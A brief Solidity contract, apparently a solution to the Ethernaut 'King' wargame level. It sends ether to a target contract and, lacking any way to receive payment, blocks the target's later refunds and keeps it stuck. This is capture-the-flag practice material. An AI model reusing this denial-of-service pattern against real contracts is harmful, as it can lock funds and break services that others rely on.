// SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

contract AttackTheKing {
// This smart contract implements an Attack targeting King.sol from Ethernaut
  function doYourThing(address targetAddress) public payable {
    (bool success,) = targetAddress.call{value: msg.value}("");
    if (!success) revert("My bad");
  }
}
